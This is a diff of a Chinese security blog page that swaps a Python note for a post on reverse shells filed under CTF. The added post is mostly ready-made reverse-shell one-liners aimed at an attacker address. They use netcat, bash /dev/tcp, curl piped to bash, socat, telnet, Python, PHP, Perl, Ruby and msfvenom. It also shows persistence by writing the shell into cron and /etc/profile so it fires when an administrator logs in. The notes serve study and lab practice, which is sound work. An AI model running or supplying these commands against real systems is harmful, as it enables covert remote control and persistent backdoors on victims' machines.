@@ -9,10 +9,10 @@
     
     <title>
         
-            Python脚本专用小抄 |
+            学习反弹shell |
         
         C3ngH&#39;s B10g
-    </title><meta name="robots" content="noindex">
+    </title>
     
 <link rel="stylesheet" href="/css/style.css">
 
@@ -235,7 +235,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        Python脚本专用小抄
+                        学习反弹shell
                     </div>
                 
 
@@ -263,12 +263,12 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2024-11-19 16:29:16</span>
+                <span class="datetime">2024-11-28 21:44:30</span>
             </span>
 
             <span class="meta-info-item post-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="datetime" data-updated="Wed Nov 20 2024 18:51:53 GMT+0800">2024-11-20 18:51:53</span>
+                <span class="datetime" data-updated="Thu Nov 28 2024 23:09:15 GMT+0800">2024-11-28 23:09:15</span>
             </span>
         
 
@@ -276,7 +276,7 @@
             <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                 <ul class="post-category-ul">
                     
-                            <li class="category-item"><a href="/categories/Python/">Python</a></li>
+                            <li class="category-item"><a href="/categories/CTF/">CTF</a></li>
                         
                     
                 </ul>
@@ -287,7 +287,7 @@
             <span class="post-tag meta-info-item border-box">
                 <ul class="post-tag-ul">
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%BC%80%E5%8F%91/">开发</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Web/">Web</a></li>
                         
                     
                 </ul>
@@ -297,12 +297,12 @@
         
         
             <span class="meta-info-item post-wordcount">
-                <i class="icon fas fa-file-word"></i>&nbsp;<span>203 字</span>
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>1.6k 字</span>
             </span>
         
         
             <span class="meta-info-item post-min2read">
-                <i class="icon fas fa-clock"></i>&nbsp;<span>1 分钟</span>
+                <i class="icon fas fa-clock"></i>&nbsp;<span>6 分钟</span>
             </span>
         
         
@@ -324,13 +324,98 @@
                     
 
                     
-                         <h3 id="压缩包">压缩包</h3>
-<h4 id="文件路径">文件路径</h4>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="built_in">print</span>(os.listdir())</span><br><span class="line"><span class="comment">#[&#x27;desktop.ini&#x27;, &#x27;flag.7z&#x27;, &#x27;pass.txt&#x27;]</span></span><br><span class="line"><span class="comment">#同目录下的文件会以列表的形式列出</span></span><br><span class="line"><span class="built_in">print</span>(os.listdir(path=<span class="string">&quot;C:/&quot;</span>))</span><br><span class="line"><span class="comment">#[&#x27;$Recycle.Bin&#x27;, &#x27;$SysReset&#x27;, &#x27;adobeTemp&#x27;, &#x27;AMD&#x27;, &#x27;AMTAG.BIN&#x27;, &#x27;Autodesk&#x27;, &#x27;betterncm&#x27;, &#x27;Config.Msi&#x27;, &#x27;Documents and Settings&#x27;, &#x27;Downloads&#x27;, &#x27;DumpStack.log.tmp&#x27;, &#x27;hiberfil.sys&#x27;, &#x27;Home&#x27;, &#x27;https_sunlogin.oray.com.localstorage&#x27;, &#x27;Logs&#x27;, &#x27;OneDriveTemp&#x27;, &#x27;onetFile&#x27;, &#x27;Output.txt&#x27;, &#x27;pagefile.sys&#x27;, &#x27;PerfLogs&#x27;, &#x27;Program Files&#x27;, &#x27;Program Files (x86)&#x27;, &#x27;ProgramData&#x27;, &#x27;Recovery&#x27;, &#x27;swapfile.sys&#x27;, &#x27;System Volume Information&#x27;, &#x27;Users&#x27;, &#x27;vfl.set&#x27;, &#x27;Windows&#x27;]</span></span><br></pre></td></tr></table></figure>
-<h4 id="判断文件后缀名">判断文件后缀名</h4>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>.endswith(suffix[, start[, end]])</span><br><span class="line"><span class="comment">#suffix为要检查的后缀名，字符串或元组，如果为元组有一个匹配就True</span></span><br><span class="line"><span class="comment">#start/end匹配开始/结束的位置</span></span><br></pre></td></tr></table></figure>
-<h4 id=""></h4>
-<!-- flag of hidden posts -->
+                         <h3 id="什么是反弹shell">什么是反弹shell</h3>
+<p>反弹 shell 是指<strong>目标主机主动向攻击者的主机发起连接</strong>，然后攻击者利用这个连接与目标主机进行交互。与之相对的是<strong>绑定 shell</strong>，它是在目标主机上开放一个监听端口，攻击者直接连接这个端口。</p>
+<h3 id="反弹shell的工作原理">反弹shell的工作原理</h3>
+<p><strong>攻击者监听</strong>：攻击者在自己的机器上打开一个监听端口，等待目标主机连接。</p>
+<p><strong>目标主机发起连接</strong>：通过漏洞利用或命令注入，攻击者让目标主机执行一条指令，这条指令会主动连接攻击者的 IP 和端口。</p>
+<p><strong>建立通信通道</strong>：连接成功后，目标主机将自己的命令行输入输出通过这个通道传递给攻击者。</p>
+<p><strong>攻击者执行命令</strong>：攻击者通过这个通道直接操作目标主机。</p>
+<p>简单点说：A攻击B，A监听自己的某个端口，B主动访问A的那个端口，在A上对B进行命令执行，谁攻击谁监听自己，谁被攻击谁主动访问</p>
+<h3 id="为什么要反弹shell">为什么要反弹shell</h3>
+<ol>
+<li>目标主机位于内网（NAT 环境）或防火墙后面，攻击者无法直接访问目标主机的开放端口</li>
+<li>目标主机有防火墙限制入站流量，反弹 shell 利用目标主机主动发起出站连接，而防火墙通常不会限制出站流量</li>
+<li>目标主机没有固定 IP， 如果目标主机使用动态分配的 IP 地址（例如内网 DHCP 分配），攻击者很难找到目标主机的 IP</li>
+<li>规避入侵检测系统（IDS）</li>
+<li>限制攻击者暴露自身位置</li>
+</ol>
+<h3 id="利用netcat反弹shell">利用netcat反弹shell</h3>
+<p><strong>攻击机开启本地监听：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netcat -lvvp 11451</span><br></pre></td></tr></table></figure>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netcat 121.xxx.xxx.xxx 11451 -e /bin/bash</span><br><span class="line"><span class="comment"># nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</span></span><br></pre></td></tr></table></figure>
+<h3 id="利用bash反弹shell">利用bash反弹shell</h3>
+<p><strong>攻击机开启本地监听：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 11451</span><br></pre></td></tr></table></figure>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/121.xxx.xxx.xxx/11451 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<h3 id="Curl配合Bash反弹shell">Curl配合Bash反弹shell</h3>
+<p>首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/121.xxx.xxx.xxx/11451 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>并开启11451端口的监听。</p>
+<p>然后再目标机上执行如下，即可反弹shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 121.xxx.xxx.xxx|bash</span><br></pre></td></tr></table></figure>
+<h3 id="将反弹shell的命令写入定时任务">将反弹shell的命令写入定时任务</h3>
+<p>我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 <code>/var/spool/cron/[crontabs]/&lt;username&gt;</code> 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。</p>
+<p>比如，当前用户名为root，我们就要将下面内容写入到 /var/spool/cron/root 中。(centos系列主机)</p>
+<p>比如，当前用户名为root，我们就要将下面内容写入到 /var/spool/cron/crontabs/root 中。(Debian/Ubuntu系列主机)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*/1  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/121.xxx.xxx.xxx/11451 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment">#每隔一分钟，向121.xxx.xxx.xxx的11451号端口发送shell</span></span><br></pre></td></tr></table></figure>
+<h3 id="将反弹shell的命令写入-etc-profile文件">将反弹shell的命令写入/etc/profile文件</h3>
+<p>将以下反弹shell的命写入/etc/profile文件中，/etc/profile中的内容会在用户打开bash窗口时执行。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/121.xxx.xxx.xxx/11451 0&gt;&amp;1 &amp;</span><br><span class="line"><span class="comment"># 最后面那个&amp;为的是防止管理员无法输入命令</span></span><br></pre></td></tr></table></figure>
+<p>当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的shell</p>
+<h3 id="利用Socat反弹shell">利用Socat反弹shell</h3>
+<p><strong>攻击机开启本地监听：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:11451 -</span><br><span class="line">或</span><br><span class="line">nc -lvvp 11451</span><br></pre></td></tr></table></figure>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-connect:121.xxx.xxx.xxx:11451 <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure>
+<h3 id="利用Telnet反弹shell">利用Telnet反弹shell</h3>
+<h4 id="方法一">方法一</h4>
+<p><strong>攻击机开启本地监听：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 11451</span><br></pre></td></tr></table></figure>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mknod</span> a p; telnet 121.xxx.xxx.xxx 11451 0&lt;a | /bin/bash 1&gt;a</span><br></pre></td></tr></table></figure>
+<h4 id="方法二">方法二</h4>
+<p><strong>攻击机需要开启两个本地监听：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 11451</span><br><span class="line">nc -lvvp 19198</span><br></pre></td></tr></table></figure>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 121.xxx.xxx.xxx 11451 | /bin/bash | telnet 121.xxx.xxx.xxx 19198</span><br></pre></td></tr></table></figure>
+<h3 id="Python-脚本反弹shell">Python 脚本反弹shell</h3>
+<p><strong>攻击机开启本地监听：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 11451</span><br></pre></td></tr></table></figure>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;121.xxx.xxx.xxx&quot;,11451));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+<h3 id="PHP-脚本反弹shell">PHP 脚本反弹shell</h3>
+<p><strong>攻击机开启本地监听：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 11451</span><br></pre></td></tr></table></figure>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;121.xxx.xxx.xxx&quot;,11451);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
+<h3 id="Perl-脚本反弹shell">Perl 脚本反弹shell</h3>
+<p><strong>攻击机开启本地监听：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 11451</span><br></pre></td></tr></table></figure>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;121.xxx.xxx.xxx&quot;;$p=11451;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
+<h3 id="Ruby-脚本反弹shell">Ruby 脚本反弹shell</h3>
+<p><strong>攻击机开启本地监听：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 11451</span><br></pre></td></tr></table></figure>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;121.xxx.xxx.xxx&quot;,&quot;11451&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br><span class="line">或</span><br><span class="line">ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;121.xxx.xxx.xxx&quot;,&quot;11451&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure>
+<h3 id="使用Metasploit生成反弹shell">使用Metasploit生成反弹shell</h3>
+<p>我们直接可以使用 <code>msfvenom -l</code> 结合关键字过滤（如cmd/unix/reverse），列出我们需要生成的各类反弹shell一句话的payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads | grep <span class="string">&#x27;cmd/unix/reverse&#x27;</span></span><br><span class="line"></span><br><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=121.xxx.xxx.xxx LPORT=11451 -f raw</span><br></pre></td></tr></table></figure>
+<h3 id="反弹shell后获取模拟终端">反弹shell后获取模拟终端</h3>
+<p>我们只需在获取的shell里面输入如下命令，即可模拟一个终端设备：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="写在最后">写在最后</h3>
+<p>在尝试的时候用自己的服务器给自己的电脑弹了个shell然后删掉了桌面上的文件，把我以为在D盘有备份的数据库实验报告删了，快进到熬夜重写。红温红温红温红温。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241128221829105.png"
+                        alt="image-20241128221829105"
+                 ></p>
+
                     
                 </div>
 
@@ -342,7 +427,7 @@
                             <ul class="post-tags-box border-box">
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E5%BC%80%E5%8F%91/">开发</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Web/">Web</a>
                                     </li>
                                 
                             </ul>
@@ -355,6 +440,27 @@
 
                 
 
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/post/suidtq/"
+                                   title="浅析Linux SUID提权"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">浅析Linux SUID提权</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
                 
 
                 
@@ -451,7 +557,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="nav-text">压缩包</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="nav-text">文件路径</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D"><span class="nav-text">判断文件后缀名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-text"></span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">什么是反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="nav-text">反弹shell的工作原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">为什么要反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8netcat%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">利用netcat反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8bash%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">利用bash反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Curl%E9%85%8D%E5%90%88Bash%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">Curl配合Bash反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%86%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%91%BD%E4%BB%A4%E5%86%99%E5%85%A5%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="nav-text">将反弹shell的命令写入定时任务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%86%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%91%BD%E4%BB%A4%E5%86%99%E5%85%A5-etc-profile%E6%96%87%E4%BB%B6"><span class="nav-text">将反弹shell的命令写入&#x2F;etc&#x2F;profile文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8Socat%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">利用Socat反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8Telnet%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">利用Telnet反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Python-%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">Python 脚本反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">PHP 脚本反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Perl-%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">Perl 脚本反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ruby-%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">Ruby 脚本反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Metasploit%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">使用Metasploit生成反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%90%8E%E8%8E%B7%E5%8F%96%E6%A8%A1%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="nav-text">反弹shell后获取模拟终端</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="nav-text">写在最后</span></a></li></ol>
     </div>
 </div>
 
@@ -639,7 +745,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="nav-text">压缩包</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="nav-text">文件路径</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D"><span class="nav-text">判断文件后缀名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-text"></span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">什么是反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="nav-text">反弹shell的工作原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">为什么要反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8netcat%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">利用netcat反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8bash%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">利用bash反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Curl%E9%85%8D%E5%90%88Bash%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">Curl配合Bash反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%86%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%91%BD%E4%BB%A4%E5%86%99%E5%85%A5%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="nav-text">将反弹shell的命令写入定时任务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%86%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%91%BD%E4%BB%A4%E5%86%99%E5%85%A5-etc-profile%E6%96%87%E4%BB%B6"><span class="nav-text">将反弹shell的命令写入&#x2F;etc&#x2F;profile文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8Socat%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">利用Socat反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8Telnet%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">利用Telnet反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Python-%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">Python 脚本反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">PHP 脚本反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Perl-%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">Perl 脚本反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ruby-%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">Ruby 脚本反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Metasploit%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">使用Metasploit生成反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%90%8E%E8%8E%B7%E5%8F%96%E6%A8%A1%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="nav-text">反弹shell后获取模拟终端</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="nav-text">写在最后</span></a></li></ol>
     </div>
 </div>
 
